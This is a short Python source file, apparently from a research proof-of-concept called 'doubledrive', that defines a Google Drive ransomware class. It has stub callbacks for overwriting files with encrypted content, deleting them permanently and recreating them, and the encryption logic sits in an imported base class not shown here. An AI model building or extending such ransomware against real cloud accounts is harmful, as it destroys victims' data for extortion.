import time

from doubledrive.cloud_drive.google_drive.google_drive import GoogleDrive
from doubledrive.cloud_ransomware.cloud_drive_ransomware import CloudDriveRansomware

class GoogleDriveRansomware(CloudDriveRansomware):

    def __init__(self, logged_in_cloud_drive: GoogleDrive, save_key_dir_path: str,):
        super().__init__(logged_in_cloud_drive, save_key_dir_path)

    def _first_stage_overwriting_finished_callback(self, paths_to_encrypted_contents):
        pass
    
    def _second_stage_deletion_finished_callback(self, paths_to_encrypted_contents):
        # No need to empty the trash bin because the delete_item function in GoogleDrive deletes files permanently
        pass
    
    def _third_stage_recreation_finished_callback(self, paths_to_encrypted_contents):
        pass